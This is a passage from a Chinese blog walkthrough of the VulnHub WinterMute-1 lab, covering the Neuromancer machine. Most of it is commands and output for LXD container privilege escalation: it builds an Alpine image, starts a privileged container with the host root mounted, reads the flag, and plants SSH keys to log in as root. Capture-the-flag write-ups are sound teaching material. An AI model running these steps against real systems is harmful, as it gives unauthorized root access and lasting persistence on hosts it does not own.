忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’</span><br><span class="line">tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’</span><br><span class="line">tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’</span><br><span class="line">tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’</span><br><span class="line">tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’</span><br><span class="line">tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’</span><br><span class="line">tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’</span><br><span class="line">tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’</span><br><span class="line">tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’</span><br><span class="line">tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’</span><br><span class="line">tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’</span><br><span class="line">tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’</span><br><span class="line">tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’</span><br><span class="line">tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’</span><br><span class="line">Downloading apk-tools-static-2.10.4-r3.apk</span><br><span class="line">|DNS-request| dl-cdn.alpinelinux.org </span><br><span class="line">|D-chain|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-4.2.2.2:53-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">|DNS-response| dl-cdn.alpinelinux.org is 151.101.40.249</span><br><span class="line">|D-chain|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-151.101.40.249:80-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’</span><br><span class="line">tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’</span><br><span class="line">alpine-devel@lists.alpinelinux.org-4a6a0840.rsa.pub: 成功</span><br><span class="line">Verified OK</span><br><span class="line">Selecting mirror http://dl-8.alpinelinux.org/alpine/v3.11/main</span><br><span class="line">fetch http://dl-8.alpinelinux.org/alpine/v3.11/main/x86_64/APKINDEX.tar.gz</span><br><span class="line">(1/19) Installing musl (1.1.24-r0)</span><br><span class="line">(2/19) Installing busybox (1.31.1-r9)</span><br><span class="line">Executing busybox-1.31.1-r9.post-install</span><br><span class="line">(3/19) Installing alpine-baselayout (3.2.0-r3)</span><br><span class="line">Executing alpine-baselayout-3.2.0-r3.pre-install</span><br><span class="line">Executing alpine-baselayout-3.2.0-r3.post-install</span><br><span class="line">(4/19) Installing openrc (0.42.1-r2)</span><br><span class="line">Executing openrc-0.42.1-r2.post-install</span><br><span class="line">(5/19) Installing alpine-conf (3.8.3-r4)</span><br><span class="line">(6/19) Installing libcrypto1.1 (1.1.1d-r3)</span><br><span class="line">(7/19) Installing libssl1.1 (1.1.1d-r3)</span><br><span class="line">(8/19) Installing ca-certificates-cacert (20191127-r0)</span><br><span class="line">(9/19) Installing libtls-standalone (2.9.1-r0)</span><br><span class="line">(10/19) Installing ssl_client (1.31.1-r9)</span><br><span class="line">(11/19) Installing zlib (1.2.11-r3)</span><br><span class="line">(12/19) Installing apk-tools (2.10.4-r3)</span><br><span class="line">(13/19) Installing busybox-suid (1.31.1-r9)</span><br><span class="line">(14/19) Installing busybox-initscripts (3.2-r2)</span><br><span class="line">Executing busybox-initscripts-3.2-r2.post-install</span><br><span class="line">(15/19) Installing scanelf (1.2.4-r0)</span><br><span class="line">(16/19) Installing musl-utils (1.1.24-r0)</span><br><span class="line">(17/19) Installing libc-utils (0.7.2-r0)</span><br><span class="line">(18/19) Installing alpine-keys (2.1-r2)</span><br><span class="line">(19/19) Installing alpine-base (3.11.3-r0)</span><br><span class="line">Executing busybox-1.31.1-r9.trigger</span><br><span class="line">OK: 8 MiB <span class="keyword">in</span> 19 packages</span><br><span class="line">root@kali:~/lxd-alpine-builder<span class="comment"># ls</span></span><br><span class="line">alpine-v3.11-x86_64-20200119_0151.tar.gz  build-alpine  LICENSE  README.md</span><br></pre></td></tr></table></figure>

<p>将alpine-v3.11-x86_64-20200119_0151.tar.gz传输到目标机上</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ta@neuromancer:/tmp$ scp root@192.168.56.102:/root/lxd-alpine-builder/alpine-v3.11-x86_64-20200119_0151.tar.gz /tmp/</span><br><span class="line">root@192.168.56.102<span class="string">&#x27;s password: </span></span><br><span class="line"><span class="string">alpine-v3.11-x86_64-20200119_0151.tar.gz                                             100% 3151KB   3.1MB/s   00:00    </span></span><br><span class="line"><span class="string">ta@neuromancer:/tmp$ ls</span></span><br><span class="line"><span class="string">alpine-v3.11-x86_64-20200119_0151.tar.gz</span></span><br><span class="line"><span class="string">f</span></span><br><span class="line"><span class="string">hsperfdata_ta</span></span><br><span class="line"><span class="string">systemd-private-14b0eedfa06043179575f7374dc44c6a-systemd-timesyncd.service-EqRj97</span></span><br></pre></td></tr></table></figure>

<p>要导入容器映像，使用以下命令：<br>“别名”是一种引用容器image而不是冗长的文件名的方便方法（根据lxc，它实际上是“指纹”）：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ta@neuromancer:/tmp$ lxc image import alpine-v3.11-x86_64-20200119_0151.tar.gz --<span class="built_in">alias</span> haxor</span><br><span class="line">Image imported with fingerprint: 468c747448ec99c6b76e5a943df89a21489eb5d605ebe5d4c341a78ec217a223</span><br><span class="line">ta@neuromancer:/tmp$ lxc image list</span><br><span class="line">+-------+--------------+--------+-------------------------------+--------+--------+------------------------------+</span><br><span class="line">| ALIAS | FINGERPRINT  | PUBLIC |          DESCRIPTION          |  ARCH  |  SIZE  |         UPLOAD DATE          |</span><br><span class="line">+-------+--------------+--------+-------------------------------+--------+--------+------------------------------+</span><br><span class="line">| haxor | 468c747448ec | no     | alpine v3.11 (20200119_01:51) | x86_64 | 3.08MB | Jan 19, 2020 at 8:16am (UTC) |</span><br><span class="line">+-------+--------------+--------+-------------------------------+--------+--------+------------------------------+</span><br></pre></td></tr></table></figure>

<p>接下来，您必须基于导入的容器映像创建一个实际的容器：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ta@neuromancer:/tmp$ lxc init haxor -c security.privileged=<span class="literal">true</span></span><br><span class="line">Creating the container</span><br><span class="line">Container name is: right-whippet</span><br><span class="line">ta@neuromancer:/tmp$ lxc list</span><br><span class="line">+---------------+---------+------+------+------------+-----------+</span><br><span class="line">|     NAME      |  STATE  | IPV4 | IPV6 |    TYPE    | SNAPSHOTS |</span><br><span class="line">+---------------+---------+------+------+------------+-----------+</span><br><span class="line">| right-whippet | STOPPED |      |      | PERSISTENT | 0         |</span><br><span class="line">+---------------+---------+------+------+------------+-----------+</span><br></pre></td></tr></table></figure>

<p>请注意，容器名称是自动分配的。我没有具体说明。尽管来自Ubuntu lxc开发人员很幽默。尽管Booj的文章包含了您需要的所有详细信息，但-c开关选项可以有效地为您提供整个主机文件系统所需的Yoda功能。接下来，需要为新容器（“ right-whippet”）指定磁盘安装选项：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ta@neuromancer:/tmp$ lxc config device add right-whippet whatever disk <span class="built_in">source</span>=/ path=/mnt/root recursive=<span class="literal">true</span></span><br><span class="line">Device whatever added to right-whippet</span><br></pre></td></tr></table></figure>

<p>如所见，装载主机文件系统的根目录&#x2F;（Neuromancer），并装载为该命名（“whatever”）到&#x2F;mnt&#x2F;root。现在可以启动容器，然后使用以下命令进入bash会话：</p>
<p>启动容器</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ta@neuromancer:/tmp$ lxc start right-whippet</span><br><span class="line">ta@neuromancer:/tmp$ lxc list</span><br><span class="line">+---------------+---------+------+------+------------+-----------+</span><br><span class="line">|     NAME      |  STATE  | IPV4 | IPV6 |    TYPE    | SNAPSHOTS |</span><br><span class="line">+---------------+---------+------+------+------------+-----------+</span><br><span class="line">| right-whippet | RUNNING |      |      | PERSISTENT | 0         |</span><br><span class="line">+---------------+---------+------+------+------------+-----------+</span><br></pre></td></tr></table></figure>

<p>进入bash提权，成功拥有root权限</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ta@neuromancer:/tmp$ lxc <span class="built_in">exec</span> right-whippet --mode=interactive /bin/sh</span><br><span class="line">~ <span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root)</span><br><span class="line">~ <span class="comment"># whoami</span></span><br><span class="line">root</span><br><span class="line">~ <span class="comment"># ls</span></span><br><span class="line">~ <span class="comment"># pwd</span></span><br><span class="line">/root</span><br></pre></td></tr></table></figure>

<h2 id="步骤7-证明我们对Neuromancer文件系统具有根目录访问权限"><a href="#步骤7-证明我们对Neuromancer文件系统具有根目录访问权限" class="headerlink" title="步骤7-证明我们对Neuromancer文件系统具有根目录访问权限"></a>步骤7-证明我们对Neuromancer文件系统具有根目录访问权限</h2><p>我们进入容器的&#x2F;mnt&#x2F;root目录：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">~ <span class="comment"># cd /mnt/root</span></span><br><span class="line">/mnt/root <span class="comment"># ls</span></span><br><span class="line">bin         etc         lib         media       proc        sbin        sys         var</span><br><span class="line">boot        home        lib64       mnt         root        snap        tmp         vmlinuz</span><br><span class="line">dev         initrd.img  lost+found  opt         run         srv         usr</span><br></pre></td></tr></table></figure>

<p>您实际上是在查看主机（Neuromancer）文件系统的根目录。现在，可以轻松地将cd进入“root”，然后看到最重要的“flag.txt”文件。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/mnt/root <span class="comment"># cd root</span></span><br><span class="line">/mnt/root/root <span class="comment"># ls</span></span><br><span class="line">flag.txt      struts2       velocity.log</span><br><span class="line">/mnt/root/root <span class="comment"># cat flag.txt</span></span><br><span class="line">be3306f431dae5ebc93eebb291f4914a</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub169.jpg"></p>
<p>但是我们还没有完成。为了使该计划生效，需要能够写入root（即&#x2F;mnt&#x2F;root&#x2F;root）：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/mnt/root/root <span class="comment"># echo fuck-all-you-shit &gt; fuck.txt</span></span><br><span class="line">/mnt/root/root <span class="comment"># cat fuck.txt</span></span><br><span class="line">fuck-all-you-shit</span><br></pre></td></tr></table></figure>

<p>是的。有用！所以…现在，只需要获得一个root shell。</p>
<h2 id="步骤8：SSH密钥生成"><a href="#步骤8：SSH密钥生成" class="headerlink" title="步骤8：SSH密钥生成"></a>步骤8：SSH密钥生成</h2><p>现在有了写访问权，需要生成一组ssh密钥。仍在容器bash会话（right-whippet）中时，该过程涉及：</p>
<ul>
<li>运行ssh-keygen。选择您喜欢的任何选项，但确保文件保存到&#x2F;mnt&#x2F;root&#x2F;root&#x2F;.ssh</li>
<li>创建一个authorized_keys文件: touch &#x2F;mnt&#x2F;root&#x2F;root&#x2F;.ssh&#x2F;authorized_keys</li>
<li>将新创建的公共密钥的内容分配到授权密钥文件中： cat &#x2F;mnt&#x2F;root&#x2F;root&#x2F;.ssh&#x2F;id_rsa.pub &gt;&gt; authorized_keys</li>
</ul>
<p>将之前&#x2F;home&#x2F;ta&#x2F;.ssh目录下的文件拷贝到&#x2F;mnt&#x2F;root&#x2F;root&#x2F;.ssh&#x2F;下</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/mnt/root/root/.ssh <span class="comment"># cp /mnt/root/home/ta/.ssh/authorized_keys authorized_keys</span></span><br><span class="line">/mnt/root/root/.ssh <span class="comment"># ls</span></span><br><span class="line">authorized_keys  known_hosts</span><br><span class="line">/mnt/root/root/.ssh <span class="comment"># cp /mnt/root/home/ta/.ssh/id_rsa id_rsa</span></span><br><span class="line">/mnt/root/root/.ssh <span class="comment"># cp /mnt/root/home/ta/.ssh/id_rsa.pub id_rsa.pub</span></span><br></pre></td></tr></table></figure>

<p>&#x2F;mnt&#x2F;root&#x2F;root&#x2F;.ssh的内容现在应如下所示：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/mnt/root/root/.ssh <span class="comment"># ls</span></span><br><span class="line">authorized_keys  id_rsa           id_rsa.pub       known_hosts</span><br></pre></td></tr></table></figure>

<h2 id="步骤9：将密钥复制到攻击机中"><a href="#步骤9：将密钥复制到攻击机中" class="headerlink" title="步骤9：将密钥复制到攻击机中"></a>步骤9：将密钥复制到攻击机中</h2><p>由于使用的是之前&#x2F;home&#x2F;ta&#x2F;.ssh&#x2F;目录下的文件，所以连接的话，如下连接即可</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># ssh -i /root/.ssh/id_rsa -p 34483 root@192.168.56.110</span></span><br><span class="line"> ----------------------------------------------------------------</span><br><span class="line">|                Neuromancer Secure Remote Access                |</span><br><span class="line">| UNAUTHORIZED ACCESS will be investigated by the Turing Police  |</span><br><span class="line"> ----------------------------------------------------------------</span><br><span class="line">Enter passphrase <span class="keyword">for</span> key <span class="string">&#x27;/root/.ssh/id_rsa&#x27;</span>: </span><br><span class="line">Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.4.0-116-generic x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com</span><br><span class="line"> * Management:     https://landscape.canonical.com</span><br><span class="line"> * Support:        https://ubuntu.com/advantage</span><br><span class="line"></span><br><span class="line">94 packages can be updated.</span><br><span class="line">44 updates are security updates.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Last login: Tue Jul  3 22:02:40 2018</span><br><span class="line">root@neuromancer:~<span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) <span class="built_in">groups</span>=0(root)</span><br><span class="line">root@neuromancer:~<span class="comment"># whoami</span></span><br><span class="line">root</span><br><span class="line">root@neuromancer:~<span class="comment"># </span></span><br></pre></td></tr></table></figure>

<p>成功连接，密码还是之前连接ta的123456</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub170.jpg"></p>
<p>在“right-whippet” sh会话中执行此操作的最简单方法是，将id_rsa和id_rsa.pub的内容显示在屏幕上，然后将其复制&#x2F;粘贴到您喜欢的文本编辑器中。确保将文件权限更改为chmod 400，否则当尝试使用它们时，这些键将被忽略（我浪费了一些时间想知道为什么直到这样做之前，这些键才一直不起作用）。</p>
<p>现在只想说，太帅会不会帅死人。。。:)))):::)))::))</p>
<h4 id="提权2总结"><a href="#提权2总结" class="headerlink" title="提权2总结"></a>提权2总结</h4><p>总而言之，Neuromancer是一台非常有趣的机器。为了达到目的，必须root另一box（Straylight），然后学习如何正确使用socat进行端口转发。一旦在Neuromancer上使用了低特权shell，特权映射就非常简单了……至少对于内核利用途径而言。但是，很高兴发现lxd提权线索隐藏在范围内.</p>
<p>我只是涉足容器（Docker）之前就某些漏洞进行了一些实验工作，但是从未真正使用容器配置问题来在主机上root。我四处搜寻以确定其他文章是否也涵盖了这个角度，但是到目前为止我还没有发现。因此…最好做一些别人可能会觉得有用的新事情。</p>
<p><font color="red">Neuromancer知识点总结:</font></p>
<ul>
<li>tty可交互式shell</li>
<li>ssh-key毒化</li>
<li>lxd容器提权(new)</li>
<li>scp命令传输文件</li>
<li>tomcat-users.xml密码泄露</li>
</ul>
<p><font color="red">Game over</font></p>
<p>不好意思，这次还是没有找到希腊某位大佬的傻瓜式一键通关脚本，i am so sorry about this…It’s a pity…</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/haha.jpg"></p>
<p><font color="green"><em><strong>The end,to be continue…</strong></em></font></p>

    </div>

    
    
    

    <footer class="post-footer">
          <div class="reward-container">
  <div>Buy me a coffee</div>
  <button>
    Donate
  </button>
  <div class="post-reward">
      <div>
        <img src="/images/wechatpay.png" alt="fdvoid0 WeChat Pay">
        <span>WeChat Pay</span>
      </div>
      <div>
        <img src="/images/alipay.png" alt="fdvoid0 Alipay">
        <span>Alipay</span>
      </div>

  </div>
</div>

          

<div class="post-copyright">
<ul>
  <li class="post-copyright-author">
      <strong>Post author:  </strong>fdvoid0
  </li>
  <li class="post-copyright-link">
      <strong>Post link: </strong>
      <a href="https://fdlucifer.github.io/2020/01/13/WinterMute-1/" title="vulnhub靶机渗透[WinterMute-1]">https://fdlucifer.github.io/2020/01/13/WinterMute-1/</a>
  </li>
  <li class="post-copyright-license">
    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</span> unless stating additionally.
  </li>
</ul>
</div>

          <div class="followme">
  <span>Welcome to my other publishing channels</span>

  <div class="social-list">

      <div class="social-item">
          <a target="_blank" class="social-link" href="https://twitter.com/fdlucifer11">
            <span class="icon">
              <i class="fab fa-twitter"></i>
            </span>

            <span class="label">Twitter</span>
          </a>
      </div>

      <div class="social-item">
          <a target="_blank" class="social-link" href="https://t.me/FDkiller">
            <span class="icon">
              <i class="fab fa-telegram"></i>
            </span>

            <span class="label">Telegram</span>
          </a>
      </div>

      <div class="social-item">
          <span class="social-link">
            <span class="icon">
              <i class="fab fa-weixin"></i>
            </span>

            <span class="label">WeChat</span>
          </span>

          <img class="social-item-img" src="/images/wechat_channel.jpg">
      </div>

      <div class="social-item">
          <a target="_blank" class="social-link" href="https://infosec.exchange/@lUc1f3r11">
            <span class="icon">
              <i class="fa fa-stack-exchange"></i>
            </span>

            <span class="label">infosec.exchange</span>
          </a>
      </div>

      <div class="social-item">
          <a target="_blank" class="social-link" href="/atom.xml">
            <span class="icon">
              <i class="fa fa-rss"></i>
            </span>

            <span class="label">RSS</span>
          </a>
      </div>
  </div>
</div>

          <div class="post-tags">
              <a href="/tags/vulnhub%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/" rel="tag"><i class="fa fa-tag"></i> vulnhub靶机练习</a>
          </div>

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/2020/01/10/In-Plain-Sight-1-0-1/" rel="prev" title="vulnhub靶机渗透[In-Plain-Sight-1-0-1]">
                  <i class="fa fa-chevron-left"></i> vulnhub靶机渗透[In-Plain-Sight-1-0-1]
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/2020/01/16/Upgrading-simple-shells-to-fully-interactive-TTYs/" rel="next" title="将simpleshell提升为全交互式的TTYshell">
                  将simpleshell提升为全交互式的TTYshell <i class="fa fa-chevron-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">


<div class="copyright">
  &copy; 2017 – 
  <span itemprop="copyrightYear">2023</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">fdvoid0</span>
</div>
<div class="wordcount">
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-line"></i>
    </span>
      <span>Word count total: </span>
    <span title="Word count total">647k</span>
  </span>
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
      <span>Reading time total &asymp;</span>
    <span title="Reading time total">39:14</span>
  </span>
</div>
<div class="busuanzi-count">
    <span class="post-meta-item" id="busuanzi_container_site_uv">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="Total Visitors">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-item" id="busuanzi_container_site_pv">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="Total Views">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>
  <div class="powered-by">Powered by <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & <span class="exturl" data-url="aHR0cHM6Ly90aGVtZS1uZXh0LmpzLm9yZy9tdXNlLw==">NexT.Muse</span>
  </div>

    </div>
  </footer>

  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>
  <div class="sidebar-dimmer"></div>
  <div class="reading-progress-bar"></div>
  <a role="button" class="book-mark-link book-mark-link-fixed"></a>

  <span class="exturl github-corner" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="Follow me on GitHub" aria-label="Follow me on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></span>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/medium-zoom/1.0.8/medium-zoom.min.js" integrity="sha256-7PhEpEWEW0XXQ0k6kQrPKwuoIomz8R8IYyuU1Qew4P8=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script>

  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
<script src="/js/third-party/search/local-search.js"></script>




  <script src="/js/third-party/pace.js"></script>

  
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>





</body>
</html>
